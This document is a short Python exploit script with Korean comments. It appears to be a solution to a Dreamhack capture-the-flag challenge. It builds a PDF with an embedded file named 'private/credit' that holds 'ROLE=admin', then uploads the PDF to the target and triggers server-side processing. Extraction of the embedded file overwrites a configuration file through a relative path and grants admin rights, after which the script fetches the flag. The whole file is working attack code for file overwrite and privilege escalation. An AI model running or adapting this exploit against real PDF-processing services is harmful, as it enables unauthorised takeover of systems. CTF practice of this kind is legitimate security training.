import fitz  # PyMuPDF
import requests

# 1. 악성 PDF 생성 (Generate Malicious PDF)
def create_malicious_pdf(filename):
    doc = fitz.open()
    page = doc.new_page()
    
    # 덮어쓸 파일의 내용 (관리자 권한 획득)
    content = b"ROLE=admin\n"
    
    # 임베디드 파일 이름 설정 (상대 경로 이용)
    # CWD가 /app 이므로, private/credit 을 지정하면 설정 파일을 덮어씀
    embedded_filename = "private/credit"
    
    doc.embfile_add(embedded_filename, content, filename=embedded_filename)
    doc.save(filename)
    print(f"[+] Malicious PDF '{filename}' created.")

# 2. 공격 수행 (Attack)
def exploit(target_url, pdf_name):
    create_malicious_pdf(pdf_name)
    
    # A. Upload
    print("[*] Uploading PDF...")
    with open(pdf_name, "rb") as f:
        r = requests.post(f"{target_url}/upload", files={"file": f})
    
    if r.status_code != 200:
        print("[-] Upload failed")
        return
        
    saved_name = r.json()["saved_as"]
    print(f"[+] Uploaded as: {saved_name}")
    
    # B. Process (Trigger Overwrite)
    print("[*] Triggering processing...")
    r = requests.post(f"{target_url}/process/{saved_name}")
    # 프로세싱 결과는 중요하지 않음 (내부적으로 파일이 추출되면서 덮어씌워짐)
    
    # C. Get Flag
    print("[*] Retrieving flag...")
    r = requests.get(f"{target_url}/flag")
    print("-" * 30)
    print(r.text)
    print("-" * 30)

if __name__ == "__main__":
    # 문제 서버 주소 (로컬 테스트 시 포트 확인)
    TARGET = "http://host8.dreamhack.games:10937" 
    PDF_NAME = "exploit.pdf"
    
    exploit(TARGET, PDF_NAME)